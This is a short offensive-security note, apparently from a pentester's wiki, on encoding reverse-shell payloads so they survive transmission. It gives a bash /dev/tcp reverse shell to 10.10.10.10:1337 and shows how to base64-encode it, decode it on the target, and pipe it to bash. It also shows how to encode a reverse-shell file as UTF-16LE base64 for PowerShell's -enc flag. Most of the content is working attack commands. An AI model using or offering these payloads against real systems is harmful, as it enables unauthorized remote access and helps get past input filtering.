# Encoded Shell Spawning

Sometimes using some [[TTY-Spawning]] tool is not enough either how characters are handled at any point client-side to server-side require encoding to be decoded back to executable form. The only assumption made is the the attacker machine is some Linux Distribution with default binaries and a encoding binary installed.

## Base64

Covert to base64 with 0 column wrapping to prevent multi-line base64 string
```bash
# Create payload
echo "/bin/bash -c 'exec bash -i &>/dev/tcp/10.10.10.10/1337 <&1'" | base64 -w0
# -w0 means wrap 0 columns 
```

Decode Payload on target machine:

Linux
```bash
echo "$base64EncodedString" | base64 -d | /bin/bash
```

For Windows convert a file contain your reverse shell
```bash
iconv -f ASCII -t UTF-16LE $reverseshell.txt | base64 | tr -d "\n"
```

```powershell
powershell.exe -enc outputFromTheCommandAbove
```
